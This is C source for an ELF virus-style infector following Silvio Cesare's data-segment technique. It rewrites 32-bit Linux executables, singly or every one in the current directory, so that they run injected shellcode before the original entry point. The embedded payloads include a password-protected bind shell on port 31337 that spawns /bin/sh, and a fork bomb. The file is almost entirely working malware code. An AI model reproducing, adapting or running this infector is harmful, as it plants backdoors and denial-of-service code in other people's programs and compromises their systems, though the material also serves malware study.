/*
elf_infector.c

ELF DATA INFECTION based on Silvio Cesare's Algorithm:
        * Patch the insertion code (parasite) to jump to the entry point
          (original)
        * Locate the data segment
                * Modify the entry point of the ELF header to point to the new
                  code (p_vaddr + p_memsz)
                * Increase p_filesz to account for the new code and .bss
                * Increase p_memsz to account for the new code
                * Find the length of the .bss section (p_memsz - p_filesz)
        * For each phdr who's segment is after the insertion
                * increase p_offset to reflect the new position after insertion
        * For each shdr who's section resides after the insertion
                * Increase sh_offset to account for the new code
        * Physically insert the new code into the file

nitr0us
nitrousenador .at. gmail .dot. com

Mexico
*/

#include<elf.h>
#include<stdio.h>
#include<unistd.h>
#include<string.h>
#include<stdlib.h>
#include<fcntl.h>
#include<dirent.h>
#include<sys/mman.h>
#include<sys/stat.h>

/*
 * SOURCE: elf_write_parasite.S
 *
 * write() and extra c0de for ELF infection purposes by nitr0us
 */
char	write_test[] =
	                              // <main>
	"\x9c"                        // pushf  
	"\x60"                        // pusha  
	"\xeb\x18"                    // jmp    1c <foo>
	                              // <bar>
	"\x59"                        // pop    %ecx
	"\x31\xc0"                    // xor    %eax,%eax
	"\x31\xdb"                    // xor    %ebx,%ebx
	"\x31\xd2"                    // xor    %edx,%edx
	"\xb0\x04"                    // mov    $0x4,%al
	"\xfe\xc3"                    // inc    %bl
	"\xb2\x19"                    // mov    $0x19,%dl
	"\xcd\x80"                    // int    $0x80
	"\x61"                        // popa   
	"\x9d"                        // popf   
	"\xbd\xed\xac\xef\x0d"        // mov    $0xdefaced,%ebp
	"\xff\xe5"                    // jmp    *%ebp
	                              // <foo>
	"\xe8\xe3\xff\xff\xff"        // call   4 <bar>
	                              // <PAYLOAD>
	"nitr0us PARASITE C0D3 ;)"                        // .ascii "nitr0us PARASITE C0D3 ;)\n"
	"\x0a";

/*
 * SOURCE: elf_forkauthbind_parasite.S
 * 
 * fork() and extra c0de for ELF infection purposes by nitr0us
 * linux-x86-authportbind by Gotfault Security
 * nitr0us modz:
 * PORT     = 31337
 * PASSWORD = n33tr0u5
 */
char	forkauthbind[] =
	                              // <main>
	"\x9c"                        // pushf  
	"\x60"                        // pusha  
	"\x31\xc0"                    // xor    %eax,%eax
	"\x83\xc0\x02"                // add    $0x2,%eax
	"\xcd\x80"                    // int    $0x80
	"\x85\xc0"                    // test   %eax,%eax
	"\x0f\x85\xac\x00\x00\x00"    // jne    bd <return_to_ep>
	"\x6a\x66"                    // push   $0x66
	"\x58"                        // pop    %eax
	"\x6a\x01"                    // push   $0x1
	"\x5b"                        // pop    %ebx
	"\x99"                        // cltd   
	"\x52"                        // push   %edx
	"\x53"                        // push   %ebx
	"\x6a\x02"                    // push   $0x2
	"\x89\xe1"                    // mov    %esp,%ecx
	"\xcd\x80"                    // int    $0x80
	"\x52"                        // push   %edx
	"\x66\x68\x7a\x69"            // pushw  $0x697a
	"\x66\x6a\x02"                // pushw  $0x2
	"\x89\xe1"                    // mov    %esp,%ecx
	"\x6a\x10"                    // push   $0x10
	"\x51"                        // push   %ecx
	"\x50"                        // push   %eax
	"\x89\xe1"                    // mov    %esp,%ecx
	"\x89\xc6"                    // mov    %eax,%esi
	"\x43"                        // inc    %ebx
	"\xb0\x66"                    // mov    $0x66,%al
	"\xcd\x80"                    // int    $0x80
	"\xb0\x66"                    // mov    $0x66,%al
	"\xd1\xe3"                    // shl    %ebx
	"\xcd\x80"                    // int    $0x80
	"\x52"                        // push   %edx
	"\x52"                        // push   %edx
	"\x56"                        // push   %esi
	"\x89\xe1"                    // mov    %esp,%ecx
	"\x43"                        // inc    %ebx
	"\xb0\x66"                    // mov    $0x66,%al
	"\xcd\x80"                    // int    $0x80
	"\x96"                        // xchg   %eax,%esi
	"\x52"                        // push   %edx
	"\x68\x72\x64\x3a\x20"        // push   $0x203a6472
	"\x68\x73\x73\x77\x6f"        // push   $0x6f777373
	"\x66\x68\x50\x61"            // pushw  $0x6150
	"\x89\xe7"                    // mov    %esp,%edi
	"\x6a\x0a"                    // push   $0xa
	"\x57"                        // push   %edi
	"\x56"                        // push   %esi
	"\x89\xe1"                    // mov    %esp,%ecx
	"\xb3\x09"                    // mov    $0x9,%bl
	"\xb0\x66"                    // mov    $0x66,%al
	"\xcd\x80"                    // int    $0x80
	"\x52"                        // push   %edx
	"\x6a\x08"                    // push   $0x8
	"\x8d\x4c\x24\x08"            // lea    0x8(%esp),%ecx
	"\x51"                        // push   %ecx
	"\x56"                        // push   %esi
	"\x89\xe1"                    // mov    %esp,%ecx
	"\xb3\x0a"                    // mov    $0xa,%bl
	"\xb0\x66"                    // mov    $0x66,%al
	"\xcd\x80"                    // int    $0x80
	"\x87\xf3"                    // xchg   %esi,%ebx
	"\x52"                        // push   %edx
	"\x68\x72\x30\x75\x35"        // push   $0x35753072
	"\x68\x6e\x33\x33\x74"        // push   $0x7433336e
	"\x89\xe7"                    // mov    %esp,%edi
	"\x8d\x74\x24\x1c"            // lea    0x1c(%esp),%esi
	"\x89\xd1"                    // mov    %edx,%ecx
	"\x80\xc1\x08"                // add    $0x8,%cl
	"\xfc"                        // cld    
	"\xf3\xa6"                    // repz cmpsb %es
	"\x74\x04"                    // je     97 <dup>
	"\xf7\xf0"                    // div    %eax
	"\xcd\x80"                    // int    $0x80
	                              // <dup>
	"\x6a\x02"                    // push   $0x2
	"\x59"                        // pop    %ecx
	                              // <dup_loop>
	"\xb0\x3f"                    // mov    $0x3f,%al
	"\xcd\x80"                    // int    $0x80
	"\x49"                        // dec    %ecx
	"\x79\xf9"                    // jns    9a <dup_loop>
	"\x6a\x0b"                    // push   $0xb
	"\x58"                        // pop    %eax
	"\x52"                        // push   %edx
	"\x68\x2f\x2f\x73\x68"        // push   $0x68732f2f
	"\x68\x2f\x62\x69\x6e"        // push   $0x6e69622f
	"\x89\xe3"                    // mov    %esp,%ebx
	"\x52"                        // push   %edx
	"\x53"                        // push   %ebx
	"\x89\xe1"                    // mov    %esp,%ecx
	"\xcd\x80"                    // int    $0x80
	"\x31\xc0"                    // xor    %eax,%eax
	"\xfe\xc0"                    // inc    %al
	"\xcd\x80"                    // int    $0x80
	                              // <return_to_ep>
	"\x61"                        // popa   
	"\x9d"                        // popf   
	"\xbd\xed\xac\xef\x0d"        // mov    $0xdefaced,%ebp
	"\xff\xe5";                    // jmp    *%ebp

/*
 * fork() bomb
 */
char	forkbomb[] = 
	                              // <main>
	"\x9c"                        // pushf  
	"\x60"                        // pusha  
	"\x31\xc0"                    // xor    %eax,%eax
	"\x83\xc0\x02"                // add    $0x2,%eax
	"\xcd\x80"                    // int    $0x80
	"\x85\xc0"                    // test   %eax,%eax
	"\x75\x08"                    // jne    15 <return_to_ep>
	"\x31\xc0"                    // xor    %eax,%eax
	"\xb0\x02"                    // mov    $0x2,%al
	                              // <bomb>
	"\xcd\x80"                    // int    $0x80
	"\xeb\xfc"                    // jmp    11 <bomb>
	                              // <return_to_ep>
	"\x61"                        // popa   
	"\x9d"                        // popf   
	"\xbd\xed\xac\xef\x0d"        // mov    $0xdefaced,%ebp
	"\xff\xe5";                    // jmp    *%ebp

char parasite[256];
int parlen, par_entry_off, verbose = 0;

extern int alphasort();
int selector(const struct dirent *);
int elf_identification(int);
int infect(const char *, int);

int main(int argc, char **argv)
{
	int		k, nfiles, npayload;
	struct dirent	**dir;

	if(argc < 3){
		fprintf(stderr, "Usage: %s [parasite_type] <elf_file | \".\" (all the executable files in the current dir)> [-v (verbose)]\n", argv[0]);
		fprintf(stderr, "Parasites types:\n");
		fprintf(stderr, "\t1\twrite(\"nitr0us PARASITE C0D3 ;)\\n\")\n");
		fprintf(stderr, "\t2\tfork() + portbind(31337) + auth(\"Password: n33tr0u5\")\n");
		fprintf(stderr, "\t3\tfork() bomb !\n");
		exit(1);
	}

	npayload = atoi(argv[1]);

	if(npayload == 1){
		parlen = sizeof(write_test);
		memcpy(parasite, write_test, parlen);
		par_entry_off = 22;
		
	} else if(npayload == 2){
		parlen = sizeof(forkauthbind);
		memcpy(parasite, forkauthbind, parlen);
		par_entry_off = 192;
	} else if(npayload == 3){
		parlen = sizeof(forkbomb);
		memcpy(parasite, forkbomb, parlen);
		par_entry_off = 24;
	} else{
		fprintf(stderr, "Invalid parasite type assh0le!\n");
		exit(0xdead);
	}

	if(argv[3])
		if(!strcmp(argv[3], "-v"))
			verbose = 1;

	/* Infect a single file */
	if(strcmp(argv[2], ".")){
		printf("\n\nInfecting %s:\n", argv[2]);
		if(!infect(argv[2], npayload))
			printf("%s Infection\t[FAILED]\n", argv[2]);
		else
			printf("%s Infection\t[OK]\n", argv[2]);

		return 0;
	}

	if((nfiles = scandir(".", &dir, selector, alphasort)) == -1){
		perror("scandir");
		exit(0xdead);
	}

	if(nfiles < 2){
		fprintf(stderr, "No executable ELF files found\n");
		exit(-1);
	}

	printf("Ready to infect %d executable ELF files(ET_EXEC)", nfiles - 1);

	for(k = 0; k < nfiles; k++){
		/* Anti self infection */
		if(strstr(argv[0], dir[k]->d_name))
			continue;

		printf("\n\nInfecting %s:\n", dir[k]->d_name);
		if(!infect(dir[k]->d_name, npayload))
			printf("%s Infection\t[FAILED]\n", dir[k]->d_name);
		else
			printf("%s Infection\t[OK]\n", dir[k]->d_name);

		sleep(1);
	}

	return 0;
}

int selector(const struct dirent *filentry){
	Elf32_Ehdr	hdr;
	int		fd;

	if(!strcmp(filentry->d_name, ".") || !strcmp(filentry->d_name, ".."))
		return 0;

	if((fd = open(filentry->d_name, O_RDONLY)) == -1){
		perror("selector: open");
		exit(-1);
	}

	if(!elf_identification(fd))
		return 0;

	lseek(fd, 0, SEEK_SET);
	read(fd, &hdr, sizeof(hdr));

	if(hdr.e_type != ET_EXEC)
		return 0;

	close(fd);

	return 1;
}

int infect(const char *name, int payload)
{
	char		*elfptr, zero = 0;
	int		fd, k, paroffset, bsslen, afterdata = 0, tmp;
	struct stat	statinfo;
	Elf32_Ehdr	*header;
	Elf32_Shdr	*section;
	Elf32_Phdr	*program;

	if((fd = open(name, O_RDWR)) == -1){
		perror("open");
		exit(-1);
	}

	if(fstat(fd, &statinfo) == -1){
		perror("stat");
		close(fd);
		exit(-1);
	}

	if((elfptr = (char *) mmap(NULL, statinfo.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED){
		perror("mmap");
		close(fd);
		exit(-1);
	}

	close(fd);

	header = (Elf32_Ehdr *) elfptr;

	/* PATCHING THE PARASITE WITH THE ORIGINAL ENTRYPOINT */
	if(verbose){
		printf("--------------------------------------------------------------------\n");
		printf("[+] Host st_size\t=\t%d\n", statinfo.st_size);
		printf("[+] Original entryp0int\t=\t0x%.8x\n", header->e_entry);
		printf("[+] Patching parasite with the original entryp0int at offset %d ...\n", par_entry_off);
		printf("--------------------------------------------------------------------\n\n");
	}
	*(int *)&parasite[par_entry_off] = header->e_entry;

	/* LOCATE THE DATA SEGMENT */
	program = (Elf32_Phdr *) (elfptr + header->e_phoff);
	for(k = 0; k < header->e_phnum; k++, program++)
		if(program->p_type != PT_DYNAMIC)
			if(program->p_type == PT_LOAD && program->p_offset){
				if(verbose){
					printf("[DATA Segment info]\n");
					printf("DATA->p_offset\t=\t%d\n", program->p_offset);
					printf("DATA->p_vaddr\t=\t0x%.8x\n", program->p_vaddr);
					printf("DATA->p_paddr\t=\t0x%.8x\n", program->p_paddr);
					printf("DATA->p_filesz\t=\t%d\n", program->p_filesz);
					printf("DATA->p_memsz\t=\t%d\n\n", program->p_memsz);
				}

				/* MODIFY THE ENTRYPOINT TO POINT TO PARASITE'S CODE */
				header->e_entry = program->p_vaddr + program->p_memsz;

				/* PARASITE'S OFFSET (PHISICALLY) */
				paroffset = program->p_offset + program->p_filesz;

				/* FIND THE LENGTH OF THE BSS */
				/* Remember, memsz must be greater than filesz 'cause the uninitialized data occupies no space in the phile-system */
				bsslen = program->p_memsz - program->p_filesz;

				break;
			}

        /* For each phdr who's segment is after the insertion
                * increase p_offset to reflect the new position after insertion */
	program = (Elf32_Phdr *) (elfptr + header->e_phoff);
	for(k = 0; k < header->e_phnum; k++, program++)
		if(program->p_type != PT_DYNAMIC)
			if(afterdata){
				program->p_offset += parlen + bsslen;
			} else if(program->p_type == PT_LOAD && program->p_offset){
				program->p_filesz += parlen + bsslen;
				program->p_memsz  += parlen + bsslen;

				if(verbose){
					printf("[NEW DATA Segment info]\n");
					printf("NEWDATA->p_filesz\t=\t%d\n", program->p_filesz);
					printf("NEWDATA->p_memsz\t=\t%d\n\n", program->p_memsz);
				}

				afterdata++;
			}
	
        /* For each shdr who's section resides after the insertion
                * Increase sh_offset to account for the new code */
	section = (Elf32_Shdr *) (elfptr + header->e_shoff);
	for(k = 0; k < header->e_shnum; k++, section++)
		if(section->sh_offset >= paroffset)
				section->sh_offset += parlen + bsslen;

	/* UPDATE THE ELF HEADER */
	if(header->e_phoff >= paroffset)
		header->e_phoff += parlen + bsslen;
	if(header->e_shoff >= paroffset)
		header->e_shoff += parlen + bsslen;

	if(msync(NULL, 0, MS_SYNC) == -1)
		perror("msync");

	/* PHYSICALLY INSERT THE PARASITE INTO THE FILE */
	if((tmp = creat("parasite.tmp", statinfo.st_mode)) == -1){
		perror("creat");
		exit(-1);
	}

	if(write(tmp, elfptr, paroffset) == -1){
		perror("write");
		exit(-1);
	}

	if(verbose){
		printf("--------------------------------------------------------------------\n");
		printf("[-] New entryp0int\t=\t0x%.8x\n", header->e_entry);

		printf("[-] Filling the BSS with %d 0's at offset %d ...\n", bsslen, lseek(tmp, 0, SEEK_CUR));
	}

	for(k = 0; k < bsslen; k++)
		write(tmp, &zero, 1);

	if(verbose)
		printf("[-] Injecting Parasite's c0de (%d bytes)\n", parlen);

	if(write(tmp, parasite, parlen) == -1){
		perror("write");
		exit(-1);
	}

	/* Copy the rest of the original file */
	if(write(tmp, elfptr + paroffset, statinfo.st_size - paroffset) == -1){
		perror("write");
		exit(-1);
	}

	close(tmp);

	if(rename("parasite.tmp", name) == -1){
		perror("rename");
		exit(-1);
	}
	
	if(stat(name, &statinfo) == -1){
		perror("stat");
		close(fd);
		exit(-1);
	}

	if(verbose){
		printf("[-] NEW Host st_size\t=\t%d\n", statinfo.st_size);
		printf("--------------------------------------------------------------------\n");
	}

	munmap(elfptr, 0);
}

int elf_identification(int fd)
{
	Elf32_Ehdr	header;

	if(read(fd, &header, sizeof(header)) == -1){
		perror("elf_identification: read");
		return 0;
	}

	/* magic number verification */
	if(header.e_ident[EI_MAG0] != ELFMAG0 ||
			header.e_ident[EI_MAG1] != ELFMAG1 ||
			header.e_ident[EI_MAG2] != ELFMAG2 ||
			header.e_ident[EI_MAG3] != ELFMAG3)
		return 0;

	/* 32-bit class verification */
	if(header.e_ident[EI_CLASS] != ELFCLASS32)
		return 0;

	/* endianess verification */
	if(header.e_ident[EI_DATA] != ELFDATA2LSB)
		return 0;

	/* elf version verification */
	if(header.e_ident[EI_VERSION] != EV_CURRENT)
		return 0;

	return 1;
}
